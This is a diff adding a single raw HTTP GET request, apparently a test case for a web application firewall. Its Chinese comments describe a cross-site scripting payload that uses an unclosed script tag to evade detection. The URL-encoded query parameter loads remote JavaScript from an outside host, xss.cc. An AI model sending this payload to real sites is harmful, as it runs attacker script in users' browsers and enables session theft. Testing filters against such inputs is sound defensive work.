@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_标签属性_数据混淆类(半闭合标签绕过)-06506831
+# 攻击载荷利用<script>标签和src属性来引入恶意代码。使用没有结束script标签的方式绕过检测。
+GET /?id=%3CSCRIPT%20SRC=http:%2F%2Fxss.cc%2Fxss.js%3F%3C%20B%20%3E&bid=hd_tag_m8mv24zg HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24zg
+RM-PRO-Token: 69929f68c74bd300b11f050018f1705a
+RM-PRO-Time: 1742808425658
+User-Agent: curl/7.83.1
+
